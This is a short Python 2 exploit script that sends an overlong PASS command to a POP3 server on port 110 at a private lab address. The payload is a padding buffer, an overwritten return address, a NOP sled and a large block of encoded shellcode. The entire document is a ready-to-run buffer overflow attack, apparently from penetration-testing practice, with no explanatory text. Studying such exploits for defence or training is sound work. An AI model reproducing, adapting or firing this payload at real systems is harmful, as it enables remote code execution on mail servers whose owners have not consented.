#!/usr/bin/python
import socket

shellcode = (
"\xbb\xa9\x45\xa5\xbd\xdb\xcd\xd9\x74\x24\xf4\x5f\x31\xc9\xb1" +
"\x52\x31\x5f\x12\x83\xef\xfc\x03\xf6\x4b\x47\x48\xf4\xbc\x05" +
"\xb3\x04\x3d\x6a\x3d\xe1\x0c\xaa\x59\x62\x3e\x1a\x29\x26\xb3" +
"\xd1\x7f\xd2\x40\x97\x57\xd5\xe1\x12\x8e\xd8\xf2\x0f\xf2\x7b" +
"\x71\x52\x27\x5b\x48\x9d\x3a\x9a\x8d\xc0\xb7\xce\x46\x8e\x6a" +
"\xfe\xe3\xda\xb6\x75\xbf\xcb\xbe\x6a\x08\xed\xef\x3d\x02\xb4" +
"\x2f\xbc\xc7\xcc\x79\xa6\x04\xe8\x30\x5d\xfe\x86\xc2\xb7\xce" +
"\x67\x68\xf6\xfe\x95\x70\x3f\x38\x46\x07\x49\x3a\xfb\x10\x8e" +
"\x40\x27\x94\x14\xe2\xac\x0e\xf0\x12\x60\xc8\x73\x18\xcd\x9e" +
"\xdb\x3d\xd0\x73\x50\x39\x59\x72\xb6\xcb\x19\x51\x12\x97\xfa" +
"\xf8\x03\x7d\xac\x05\x53\xde\x11\xa0\x18\xf3\x46\xd9\x43\x9c" +
"\xab\xd0\x7b\x5c\xa4\x63\x08\x6e\x6b\xd8\x86\xc2\xe4\xc6\x51" +
"\x24\xdf\xbf\xcd\xdb\xe0\xbf\xc4\x1f\xb4\xef\x7e\x89\xb5\x7b" +
"\x7e\x36\x60\x2b\x2e\x98\xdb\x8c\x9e\x58\x8c\x64\xf4\x56\xf3" +
"\x95\xf7\xbc\x9c\x3c\x02\x57\x63\x68\x0f\xc9\x0b\x6b\x0f\x04" +
"\x90\xe2\xe9\x4c\x38\xa3\xa2\xf8\xa1\xee\x38\x98\x2e\x25\x45" + 
"\x9a\xa5\xca\xba\x55\x4e\xa6\xa8\x02\xbe\xfd\x92\x85\xc1\x2b" +
"\xba\x4a\x53\xb0\x3a\x04\x48\x6f\x6d\x41\xbe\x66\xfb\x7f\x99" +
"\xd0\x19\x82\x7f\x1a\x99\x59\xbc\xa5\x20\x2f\xf8\x81\x32\xe9" +
"\x01\x8e\x66\xa5\x57\x58\xd0\x03\x0e\x2a\x8a\xdd\xfd\xe4\x5a" +
"\x9b\xcd\x36\x1c\xa4\x1b\xc1\xc0\x15\xf2\x94\xff\x9a\x92\x10" +
"\x78\xc7\x02\xde\x53\x43\x22\x3d\x71\xbe\xcb\x98\x10\x03\x96" +
"\x1a\xcf\x40\xaf\x98\xe5\x38\x54\x80\x8c\x3d\x10\x06\x7d\x4c" +
"\x09\xe3\x81\xe3\x2a\x26")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "\x90" * 8 + shellcode
try:
    print "\nSending evil buffer..."
    s.connect(("192.168.1.110",110))
    data = s.recv(1024)
    print data
    s.send("USER test"+"\r\n")
    data = s.recv(1024)
    print data
    s.send("PASS " + buffer + "\r\n")
    print "\nDone"
    
except:
    print "Could not connect to POP3!"
